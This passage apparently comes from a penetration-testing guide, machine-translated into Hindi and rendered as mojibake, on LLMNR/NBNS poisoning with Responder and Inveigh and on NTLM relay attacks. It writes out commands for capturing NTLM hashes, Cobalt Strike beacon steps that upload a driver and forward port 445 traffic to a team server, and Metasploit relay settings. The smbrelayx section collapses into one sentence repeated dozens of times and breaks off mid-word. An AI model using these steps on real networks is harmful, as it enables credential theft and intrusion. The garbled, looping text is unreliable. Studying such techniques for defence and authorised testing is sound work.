рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

> рдпрд╣ рд╣рдорд▓рд╛ рдЕрддреНрдпрдВрдд рдкреНрд░рднрд╛рд╡реА рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЖрд╢реНрд╡рд╕реНрдд NTLMv1/2 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```bash
./Responder.py -I eth0 -Pdv
```
#### рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ - рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдЕрд╡рдЧрдгрд┐рдд рдХрд░рдирд╛

рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ **рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рднреА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░реЗрдЧрд╛**ред рдЬрдм рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛, **рд╡рд╣ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛** рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ рдХреЛ "рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕" (рд╢рд╛рдпрдж рдПрдХ **NTLMv2 рдЪреИрд▓реЗрдВрдЬ/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛**) рдХреЛ **рдЕрд╡рдЧрдгрд┐рдд рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреА:

NetNTLMv1 рдкрд░ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛ рдпрд╛ ESS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░

> Inveigh рдПрдХ PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS рд╕реНрдкреВрдлрд░ рдФрд░ рдореИрди-рдЗрди-рдж-рдорд┐рдбрд▓ рдЯреВрд▓ рд╣реИ рдЬреЛ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд░/рд░реЗрдб рдЯреАрдорд░реНрд╕ рдХреА рдорджрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдЦреБрдж рдХреЛ рдПрдХ Windows рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рд╕реАрдорд┐рдд рдкрд╛рддреЗ рд╣реИрдВред

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) рдПрдХ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдерд╛, рдЕрдм рдпрд╣ рдПрдХ C# рдмрд╛рдЗрдирд░реА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░ рдХреА рддрд░рд╣реАрди рдореБрдЦреНрдп рд╕реБрд╡рд┐рдзрд╛рдПрдВ рд╣реИрдВред рдПрдХ [**рд╡рд┐рдХрд┐**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) рд╣реИ рдЬреЛ рд╕рднреА рдкреИрд░рд╛рдореАрдЯрд░ рдФрд░ рдЙрдкрдпреЛрдЧ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рддреА рд╣реИред\
рдЗрдиреНрд╡реЗрд╣рдЬрд╝реАрд░реЛ рдореЗрдВ рдПрдХ рдФрд░ рд╕рдВрд╕реНрдХрд░рдг рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)ред

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

рдпрд╛ рдЗрд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдПрдВ:
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
рдпрд╛ C# рд╕рдВрд╕реНрдХрд░рдг рдЪрд▓рд╛рдПрдВ:
```bash
Inveigh.exe
```
## NTLM рд░рд┐рд▓реЗ рд╣рдорд▓рд╛

рдпрд╣ рд╣рдорд▓рд╛ рдПрдХ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ **SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░реЛрдВ** рдХреЛ рдПрдХ **рд▓рдХреНрд╖рд┐рдд рдорд╢реАрди** рдкрд░ рд░рд┐рд▓реЗ рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рд╕рддреНрд░ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдпрд╣ рдЖрдкрдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ **рд╕рд┐рд╕реНрдЯрдо рд╢реИрд▓** рдореЗрдВ рдбреНрд░реЙрдк рдХрд░реЗрдЧрд╛ред рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд░рд┐рд▓реЗ рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рд░рд┐рд▓реЗ рдХрд┐рдП рдЧрдП** рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдирд┐рдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╣реБрдВрдЪ рд╣реИ рдФрд░ **SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рдЕрдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред

### 445 рдлрд╝реЙрд░рд╡рд░реНрдб рдФрд░ рдЯрдирд▓рд┐рдВрдЧ

{% hint style="warning" %}
рдпрджрд┐ рдЖрдк **рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдорд╢реАрди рдкреНрд░рд╡рд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрднрд╛рдЧ рдХреЗ рдХрд┐рд╕реА рднреА **рдЙрдкрдХрд░рдгреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд┐рд▓реЗ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдЗрд╕рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреАред
{% endhint %}

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд░реЗрдб рдЯреАрдо рдореЗрдВ рдРрд╕рд╛ рдорд╛рдорд▓рд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рд░реЗрдб рдЯреАрдо рдореЗрдВ рдЖрдкрдХреЛ рдЖрдорддреМрд░ рдкрд░ **рдПрдХ рд╡рд┐рдВрдбреЛрдЬ рдорд╢реАрди рдХреЗ рдкреЛрд░реНрдЯ 445 рдХрд╛ рдЯреНрд░реИрдлрд┐рдХ рдЕрдкрдиреА рдорд╢реАрди рдкрд░ рдлрд╝реЙрд░рд╡рд░реНрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА** рдФрд░ рдлрд┐рд░ рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рдЙрд╕ рдЙрдкрдХрд░рдг рдХреЗ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд╛рдкрд╕ **рд░реВрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА** рддрд╛рдХрд┐ рдЖрдВрддрд░рд┐рдХ рдореЗрдВ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдорд╢реАрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВред

рдЯреВрд▓ [**PortBender**](https://github.com/praetorian-inc/PortBender) рдПрдХ рдбреНрд░рд╛рдЗрд╡рд░ рд╣реИ рдЬреЛ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ **рдкреЛрд░реНрдЯ 445 рдкрд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рдкреЛрд░реНрдЯ** (рдЬреИрд╕реЗ 8445) рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **рд╣рдо рдмрд╛рдЗрдВрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдбреНрд░рд╛рдЗрд╡рд░ рд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдореЗрдВ рд╕реНрдерд╛рдирд┐рдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╣реБрдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпрд╣ рд╕рдордЭрдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ `cd C:\Windows\System32\drivers` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдордпрдмрджреНрдз рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣рд╛рдВ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рдВрдбреЛрдЬ рдбреНрд░рд╛рдЗрд╡рд░ рдЬрд╛рддреЗ рд╣реИрдВред
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit

Metasploit is a powerful framework used for penetration testing and exploiting vulnerabilities in computer systems. It provides a wide range of tools and modules that can be used to identify and exploit security weaknesses in target systems.

Metasploit is designed to automate the process of penetration testing and makes it easier for security professionals to assess the security posture of a network or system. It includes a vast collection of exploits, payloads, and auxiliary modules that can be used to carry out various types of attacks.

With Metasploit, you can perform tasks such as scanning for open ports, identifying vulnerable services, and launching exploits against target systems. It also allows you to create custom payloads and generate malicious files that can be used to gain unauthorized access to target systems.

Metasploit is widely used by both ethical hackers and malicious actors due to its extensive capabilities and ease of use. It is constantly updated with new exploits and modules, making it a valuable tool for security professionals.

Overall, Metasploit is a versatile and powerful framework that can be used to assess the security of computer systems and networks. It is an essential tool for penetration testers and security researchers.
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx

smbrelayx рдПрдХ рдЯреВрд▓ рд╣реИ рдЬреЛ SMB рд░рд┐рд▓реЗ рдЕрдЯреИрдХ рдХреЛ рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИред рдпрд╣ рдЯреВрд▓ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рд╕рд░реНрд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx 